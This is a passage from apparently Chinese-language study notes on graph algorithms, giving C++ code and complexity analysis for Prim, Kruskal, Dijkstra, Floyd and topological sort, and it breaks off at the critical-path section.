class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">int</span> g[N][N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">prim</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++)</span><br><span class="line"><span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">t = j;</span><br><span class="line">st[t] = <span class="literal">true</span>;</span><br><span class="line">res += dist[t];</span><br><span class="line"><span class="comment">// 这个一定要加，防止溢出</span></span><br><span class="line"><span class="keyword">if</span> (res &gt; <span class="number">0x3f3f3f3f</span> / <span class="number">2</span>) <span class="keyword">return</span> <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++)</span><br><span class="line">dist[j] = <span class="built_in">min</span>(dist[j], g[t][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(g, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">while</span> (m --)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">g[a][b] = g[b][a] = <span class="built_in">min</span>(g[a][b], c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> ans = <span class="built_in">prim</span>();</span><br><span class="line"><span class="keyword">if</span> (ans &gt; <span class="number">0x3f3f3f3f</span> / <span class="number">2</span>) cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; ans;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-4-性能分析"><a href="#3-1-4-性能分析" class="headerlink" title="3.1.4 性能分析"></a>3.1.4 性能分析</h3><ul><li><strong>空间复杂度</strong>：使用一个dist数组用于记录距离，$O(|V|)$</li><li><strong>时间复杂度</strong>：两重循环，$O(|V|^2)$，不依赖于E，<strong>适合求解边稠密图的最小生成树</strong></li></ul><h2 id="3-2-克鲁斯卡尔（Kruskal）算法"><a href="#3-2-克鲁斯卡尔（Kruskal）算法" class="headerlink" title="3.2 克鲁斯卡尔（Kruskal）算法"></a>3.2 克鲁斯卡尔（Kruskal）算法</h2><h3 id="3-2-1-算法思想"><a href="#3-2-1-算法思想" class="headerlink" title="3.2.1 算法思想"></a>3.2.1 算法思想</h3><p>按边权选择合适的边来构造最小生成树。</p><ul><li>初始状态为只有$n$个顶点而无边的非连通图$T&#x3D;(V,{\phi})$，每个顶点自成一个连通分量；</li><li>在$E$中选取代价最小的边，若该边依附的顶点落在$T$中不同的连通分量上，则将此边加入到$T$中；否则，舍去此边，选取下一条代价最小的边依此类推，直至$T$中所有顶点都在同一连通分量上为止；</li></ul><h3 id="3-2-2-算法过程"><a href="#3-2-2-算法过程" class="headerlink" title="3.2.2 算法过程"></a>3.2.2 算法过程</h3><p><img src="https://img-blog.csdnimg.cn/2020052116522528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NDIzMTY2,size_16,color_FFFFFF,t_70"></p><h3 id="3-2-3-代码实现"><a href="#3-2-3-代码实现" class="headerlink" title="3.2.3 代码实现"></a>3.2.3 代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200010</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b, w;</span><br><span class="line">&#125;edges[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> pre[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(Edge&amp; x, Edge&amp; y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x.w &lt; y.w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> pre[x] = (pre[x] == x ? x : <span class="built_in">find</span>(pre[x]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> res = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i ++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> e = edges[i];</span><br><span class="line"><span class="type">int</span> a = <span class="built_in">find</span>(e.a), b = <span class="built_in">find</span>(e.b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a == b) <span class="keyword">continue</span>;</span><br><span class="line">pre[a] = b;</span><br><span class="line">res += e.w, cnt ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt &lt; n - <span class="number">1</span> ? <span class="number">0x3f3f3f3f</span> : res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="comment">// 初始化并查集</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) pre[i] = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i ++) </span><br><span class="line">cin &gt;&gt; edges[i].a &gt;&gt; edges[i].b &gt;&gt; edges[i].w;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(edges + <span class="number">1</span>, edges + <span class="number">1</span> + m, cmp);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans = <span class="built_in">Kruskal</span>();</span><br><span class="line"><span class="keyword">if</span> (ans == <span class="number">0x3f3f3f3f</span>) cout &lt;&lt; <span class="string">&quot;impossible&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; ans;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-4-性能分析"><a href="#3-2-4-性能分析" class="headerlink" title="3.2.4 性能分析"></a>3.2.4 性能分析</h3><ul><li><strong>空间复杂度</strong>：使用一个$dist$数组用于记录距离，$O(|V|)$</li><li><strong>时间复杂度</strong>：通常采用堆来存放边的集合，选择边权最小的边需要$O(log|E|)$的时间，同时遍历每条边，时间复杂度为$O(|E|log|E|)$，<strong>适用于求解边稀疏而顶点较多的图</strong></li></ul><h3 id="3-2-5-具体应用"><a href="#3-2-5-具体应用" class="headerlink" title="3.2.5 具体应用"></a>3.2.5 具体应用</h3><ul><li>n个城市间建立通信联络网</li></ul><hr><h1 id="4-最短路径"><a href="#4-最短路径" class="headerlink" title="4 最短路径"></a>4 最短路径</h1><p>带权有向图G的最短路径问题一般可分为两类：</p><ol><li>单源最短路</li><li>每对顶点间的最短路径</li></ol><h2 id="4-1-Dijkstra算法"><a href="#4-1-Dijkstra算法" class="headerlink" title="4.1 Dijkstra算法"></a>4.1 Dijkstra算法</h2><p>解决单源最短路径问题的一个常用算法是Dijkstra算法，它是由E.W.Dijkstra提出的一种按路径长度递增的次序产生到各顶点最短路径的贪心算法。</p><h3 id="4-1-1-算法思想"><a href="#4-1-1-算法思想" class="headerlink" title="4.1.1 算法思想"></a>4.1.1 算法思想</h3><p>首先，在这些最短路径中，长度最短的这条路径上必定只有一条弧，且它的权值是从源点出发的所有弧上权的最小值。</p><p>其次，第二条长度次短的最短路径只可能有两种情况：</p><ol><li><p>或者只含一条从源点出发的弧且小于其它从源点出发的弧上的权值；&#x20;</p></li><li><p>或者是一条只经过已求得最短路径的顶点的路径。</p></li></ol><p>依次类推，按迪杰斯特拉算法先后求得的每一条最短路径必定只有两种情况，或者是由源点直接到达终点，或者是只经过已经求得最短路径的顶点到达终点。</p><h3 id="4-1-2-求最短路径步骤-xD"><a href="#4-1-2-求最短路径步骤-xD" class="headerlink" title="4.1.2 求最短路径步骤&#xD;"></a>4.1.2 求最短路径步骤&#xD;</h3><ol><li>初始化：令 S&#x3D;{V0}，T&#x3D;{其余顶点}，dist[]的初始值$dist[i]&#x3D;arcs[0][i], i&#x3D;1,2,…,n-1$。</li><li>从顶点集合V-S中选出$v_{j}$，满足$dist[j]&#x3D; \min {dist[i]|vi\in V-S}$，$v_{j}$就是当前求得的一条从$v_{0}$出发的最短路径的终点，令$S&#x3D;S\bigcup{j}$。</li><li>对T中顶点的距离值进行修改：若加进W作中间顶点，从V0到Vi的距离值比不加W的路径要短，则修改此距离值。</li><li>重复上述步骤，直到S中包含所有顶点，即S&#x3D;V为止。</li></ol><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%9B%BE/image_SD_1cEKC7Q.png"></p><h3 id="4-1-3-代码实现"><a href="#4-1-3-代码实现" class="headerlink" title="4.1.3 代码实现"></a>4.1.3 代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 稠密图，采用邻接矩阵存储</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> g[N][N], dist[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstra</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++)</span><br><span class="line">            <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j])) </span><br><span class="line">                t = j;</span><br><span class="line">        st[t] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 更新到其他点的距离</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++)</span><br><span class="line">            dist[j] = <span class="built_in">min</span>(dist[j], dist[t] + g[t][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dist[n] == <span class="number">0x3f3f3f3f</span> ? <span class="number">-1</span> : dist[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="built_in">memset</span>(g, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> g);</span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">        g[a][b] = <span class="built_in">min</span>(g[a][b], c);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">dijkstra</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-4-性能分析"><a href="#4-1-4-性能分析" class="headerlink" title="4.1.4 性能分析"></a>4.1.4 性能分析</h3><ul><li><strong>时间复杂度</strong>：$O(n²)$</li><li><strong>空间复杂度</strong>：$O(n)$</li></ul><p>Dijkstra算法是基于贪心策略，当边上带有负值时，该算法并不适用，会进入死循环。</p><h2 id="4-2-Floyd算法"><a href="#4-2-Floyd算法" class="headerlink" title="4.2 Floyd算法"></a>4.2 Floyd算法</h2><p>如何求每一对顶点之间的最短路径？</p><ol><li><p>每次以一个顶点为源点，重复执行Dijkstra算法n次：$T(n)&#x3D;O(n^3)$。</p></li><li><p>弗洛伊德(Floyd)算法</p></li></ol><p><strong>算法思想</strong>：逐个顶点试探法。</p><h3 id="4-2-1-求最短路径步骤-xA"><a href="#4-2-1-求最短路径步骤-xA" class="headerlink" title="4.2.1 求最短路径步骤&#xA;"></a>4.2.1 求最短路径步骤&#xA;</h3><ol><li>初始时设置一个n阶方阵，令其对角线元素为0，若存在弧$&lt;V_i,V_j&gt;$，则对应元素为权值；否则为∞。</li><li>逐步试着在原直接路径中增加中间顶点，若加入中间点后路径变短，则修改之；否则维持原值。</li><li>所有顶点试探完毕，算法结束。</li></ol><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%9B%BE/image_MH2j8EZWlF.png"></p><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%9B%BE/image_Wjqn9qnUvo.png"></p><h3 id="4-2-2-代码实现"><a href="#4-2-2-代码实现" class="headerlink" title="4.2.2 代码实现"></a>4.2.2 代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">210</span>;</span><br><span class="line"><span class="type">int</span> dist[N][N];</span><br><span class="line"><span class="type">int</span> n, m, q;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">floyd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++)</span><br><span class="line">                dist[i][j] = <span class="built_in">min</span>(dist[i][j], dist[i][k] + dist[k][j]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m &gt;&gt; q;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++)</span><br><span class="line">            <span class="keyword">if</span> (i == j) dist[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> dist[i][j] = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">        dist[a][b] = <span class="built_in">min</span>(dist[a][b], c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">floyd</span>();</span><br><span class="line">    <span class="keyword">while</span> (q --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x, y; cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">        <span class="keyword">if</span> (dist[x][y] &gt; <span class="number">0x3f3f3f3f</span> / <span class="number">2</span>) cout &lt;&lt; <span class="string">&quot;impossible&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span> cout &lt;&lt; dist[x][y] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-3-性能分析"><a href="#4-2-3-性能分析" class="headerlink" title="4.2.3 性能分析"></a>4.2.3 性能分析</h3><ul><li><strong>时间复杂度</strong>：$O(n^3)$，不过由于其代码很紧凑，且不包含其他复杂的数据结构，因此隐含的常数系数是很小的。</li><li><strong>空间复杂度</strong>：$O(n^2)$</li></ul><p>Floyd算法允许图中有带负权值的边，但不允许有包含带负权值的边组成的回路。</p><hr><h1 id="5-拓扑排序"><a href="#5-拓扑排序" class="headerlink" title="5 拓扑排序"></a>5 拓扑排序</h1><p><strong>AOV网</strong>：用顶点表示活动，用弧表示活动间优先关系的有向图称为顶点表示活动的网（Activity On Vertex network），简称AOV网。</p><ul><li>若&lt;$v_{i}$, $v_{j}$&gt;是图中有向边，则$v_{i}$是$v_{j}$的直接前驱；$v_{j}$是$v_{i}$的直接后继</li><li>AOV网中不允许有回路，这意味着某项活动以自己为先决条件</li></ul><p><strong>拓扑排序</strong>：把AOV网络中各顶点按照它们相互之间的优先关系排列成一个线性序列的过程叫拓扑排序。</p><h2 id="5-1-算法思想"><a href="#5-1-算法思想" class="headerlink" title="5.1 算法思想"></a>5.1 算法思想</h2><ul><li>在有向图中选一个没有前驱的顶点且输出之；</li><li>从图中删除该顶点和所有以它为尾的弧；</li><li>重复上述两步，直至全部顶点均已输出；或者当图中不存在无前驱的顶点为止。</li></ul><h2 id="5-2-算法过程"><a href="#5-2-算法过程" class="headerlink" title="5.2 算法过程"></a>5.2 算法过程</h2><p><img src="https://pica.zhimg.com/v2-def95e93dd0e7eba3144c688c550e612_1440w.jpg?source=172ae18b"></p><h2 id="5-3-代码实现"><a href="#5-3-代码实现" class="headerlink" title="5.3 代码实现"></a>5.3 代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> d[N];</span><br><span class="line"><span class="type">int</span> q[N], hh, tt = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">top_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line"><span class="keyword">if</span> (!d[i]) q[++ tt] = i;</span><br><span class="line"><span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> t = q[hh ++];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = e[i];</span><br><span class="line"><span class="keyword">if</span> (-- d[j] == <span class="number">0</span>)</span><br><span class="line">q[++ tt] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> tt == n - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">while</span> (m --)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b; cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">d[b] ++;</span><br><span class="line">e[idx] = b, ne[idx] = h[a], h[a] = idx ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">top_sort</span>())</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= tt; i ++)cout &lt;&lt; q[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-4-性能分析"><a href="#5-4-性能分析" class="headerlink" title="5.4 性能分析"></a>5.4 性能分析</h2><ul><li><strong>空间复杂度</strong>：使用一个辅助队列$Q$，$O(|V|)$</li><li><strong>时间复杂度</strong>：从队列中取出每个点的同时还要遍历从它出发的边，所以时间复杂度为$O(|V|+|E|)$</li></ul><h2 id="5-5-逆拓扑排序"><a href="#5-5-逆拓扑排序" class="headerlink" title="5.5 逆拓扑排序"></a>5.5 逆拓扑排序</h2><p>与上述拓扑排序过程相反，先输出出度为0的点，然后删除所有以该顶点为终点的有向边，直到当前AVO网为空。</p><h3 id="5-5-1-具体应用"><a href="#5-5-1-具体应用" class="headerlink" title="5.5.1 具体应用"></a>5.5.1 具体应用</h3><ul><li>学生选修课程问题</li></ul><hr><h1 id="6-关键路径"><a href="#6-关键路径" class="headerlink" title="6 关键路径"></a>6 关键路径</h1><p><strong>AOE网（Activity On 